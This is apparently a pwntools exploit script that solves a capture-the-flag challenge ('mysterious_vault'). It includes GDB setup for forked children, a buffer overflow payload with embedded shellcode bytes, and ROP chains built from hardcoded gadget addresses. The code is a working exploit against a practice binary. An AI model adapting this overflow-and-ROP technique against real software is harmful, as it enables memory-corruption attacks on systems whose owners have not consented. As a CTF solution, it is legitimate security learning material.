from pwn import *


# initialize the binary
binary = "./mysterious_vault"
elf = context.binary = ELF(binary, checksec=False)

# sets it up so both child processes break after forking, but we don't follow them
# then, parent process breaks at wait() so we can switch to the child processes
gs = """
set follow-fork-mode parent
set detach-on-fork off
set follow-exec-mode new
catch exec
b wait
continue

inferior 2
c
b *0x401a95

inferior 3
c
b *0x4012a8
"""
# uncomment to let both child processes do their thing
# gs = """
# set follow-fork-mode parent
# b wait
# continue
# """

if args.REMOTE:
    p = remote("chal.2025-us.ductf.net", 30019)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### OVERFLOW ###
p.sendline(b'c'*0x1fe)
payload = flat(
    # padding
    b'b\x00',                               # just to pass the first check
    b'b'*6,
    p64(0),                                 # 0x1337010 - exit code
    p64(0x3c),                              # 0x1337018 - exit syscall number

    # 0x1337020 - the 64-byte pattern that needs to go into 0x1337000
    b"\x31\xd2\x48\x8d\x35\x1c\x00\x00\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b",

    b'a'*120,                               # remaining padding padding

    # 3001 ROP chain - does syscall(exit, 0)
    p64(0x1337020),                         # rbp - set for the gadget
    p64(0x401a5a),                          # rip - mov rax,qword ptr[rbp-0x8]; mov rdi,qword ptr[rbp-0x10]; syscall

    # 3000 ROP chain
    b'd'*8,                                 # rbp

    # adding in a loop here so we can "sleep" for a bit while the second child does its thing
    # so we will be writing to 0x4a6000 from 0x4a6001 for n iterations
    p64(0x461383),                          # pop rcx; cwde; add al, 0; ret
    p64(0x5000),                            # n = number of instructions to "sleep" for
    p64(0x404fe2),                          # pop rsi; ret
    p64(0x4a6000),                          # source address
    p64(0x46c4be),                          # pop rdi; ret
    p64(0x4a6001),                          # destination address
    p64(0x413c6b),                          # rep movsb byte ptr [rdi], byte ptr [rsi]; ret

    # now, we actually move the 64-byte pattern from 0x1337020 to 0x1337000
    p64(0x461383),                          # pop rcx; cwde; add al, 0; ret
    p64(0x40),                              # number of bytes to move

    p64(0x404fe2),                          # pop rsi; ret
    p64(0x1337020),                         # source address

    p64(0x46c4be),                          # pop rdi; ret
    p64(0x1337000),                         # destination address

    p64(0x413c6b),                          # rep movsb byte ptr [rdi], byte ptr [rsi]; ret
    p64(0x401ffa),                          # exit(0)
)
p.send(payload)
p.interactive()